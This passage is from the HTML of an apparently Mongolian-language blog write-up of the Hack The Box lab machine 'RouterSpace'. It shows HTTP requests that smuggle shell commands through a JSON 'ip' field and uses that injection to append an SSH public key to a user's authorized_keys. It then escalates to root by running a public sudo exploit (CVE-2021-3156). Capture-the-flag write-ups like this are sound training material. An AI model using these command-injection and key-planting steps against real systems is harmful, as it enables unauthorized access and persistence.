</span></span><span style=display:flex><span>ETag: W/<span style=color:#e6db74>&#34;35-ERWpoCDHm08FgkJsyQjiOS48qOc&#34;</span>
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>07</span> Mar <span style=color:#ae81ff>2022</span> 10:33:42 GMT
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n&#34;</span>
</span></span></code></pre></div><h3 id=4-ssh>4. SSH<a hidden class=anchor aria-hidden=true href=#4-ssh>#</a></h3><p>.ssh байгааг шалгах:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
</span></span><span style=display:flex><span>accept: application/json, text/plain, */*
</span></span><span style=display:flex><span>user-agent: RouterSpaceAgent
</span></span><span style=display:flex><span>Content-Type: application/json
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>Host: routerspace.htb
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;ip&#34;</span>:<span style=color:#e6db74>&#34;\nls -la /home/paul/.ssh&#34;</span><span style=color:#f92672>}</span>   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>###</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>X-Powered-By: RouterSpace
</span></span><span style=display:flex><span>X-Cdn: RouterSpace-88312
</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>102</span>
</span></span><span style=display:flex><span>ETag: W/<span style=color:#e6db74>&#34;66-16qi+Er+2AnScuVbth8VO+vonXE&#34;</span>
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>07</span> Mar <span style=color:#ae81ff>2022</span> 10:37:06 GMT
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;\ntotal 8\ndrwx------ 2 paul paul 4096 Feb 17 18:30 .\ndrwxr-xr-x 8 paul paul 4096 Feb 17 18:30 ..\n&#34;</span>
</span></span></code></pre></div><p><code>public id_rsa</code> -г paul -н .ssh дотор хуулж өгөх.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Local VM</span>
</span></span><span style=display:flex><span>ssh-keygen
</span></span><span style=display:flex><span>ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>1</span> va4mi va4mi   <span style=color:#ae81ff>32</span> Mar  <span style=color:#ae81ff>7</span> 05:38 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> va4mi va4mi  <span style=color:#ae81ff>766</span> Mar  <span style=color:#ae81ff>7</span> 05:38 ..
</span></span><span style=display:flex><span>-rw------- <span style=color:#ae81ff>1</span> va4mi va4mi <span style=color:#ae81ff>2610</span> Mar  <span style=color:#ae81ff>7</span> 05:38 id_rsa
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> va4mi va4mi  <span style=color:#ae81ff>576</span> Mar  <span style=color:#ae81ff>7</span> 05:38 id_rsa.pub
</span></span></code></pre></div><p>burp-д:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#34;\necho &#39;your public id_rsa.pub&#39; &gt;&gt; /home/paul/.ssh/authorized_keys&#34;</span>
</span></span></code></pre></div><figure><img loading=lazy src=/images/routerspace_post_image_4.png></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span><span style=display:flex><span>ssh -i id_rsa paul@10.10.11.148
</span></span></code></pre></div><p>user.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>159092********
</span></span></code></pre></div><h3 id=5-privilege-escalation>5. Privilege escalation<a hidden class=anchor aria-hidden=true href=#5-privilege-escalation>#</a></h3><h4 id=51-linpeas>5.1 linpeas<a hidden class=anchor aria-hidden=true href=#51-linpeas>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -i /root/.ssh/id_rsa linpeas.sh paul@10.10.11.148
</span></span><span style=display:flex><span>chmod +x linpeas.sh
</span></span><span style=display:flex><span>/.linpeas.sh | tee output
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╔══════════╣ Sudo version                                                                                                                                           
</span></span><span style=display:flex><span>╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                          
</span></span><span style=display:flex><span>Sudo version 1.8.31 
</span></span></code></pre></div><h4 id=52-cve-2021-3156>5.2 CVE-2021-3156<a hidden class=anchor aria-hidden=true href=#52-cve-2021-3156>#</a></h4><p><a href=https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py>https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py</a>
Machine VM:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>scp -i /root/.ssh/id_rsa exploit.py  paul@10.10.11.148:.
</span></span><span style=display:flex><span>python3 exploit.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1001<span style=color:#f92672>(</span>pau
</span></span></code></pre></div><p>root.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>f4f2e0ec*********
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="хуулах";function s(){t.innerHTML="хуулсан!",setTimeout(()=>{t.innerHTML="хуулах"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>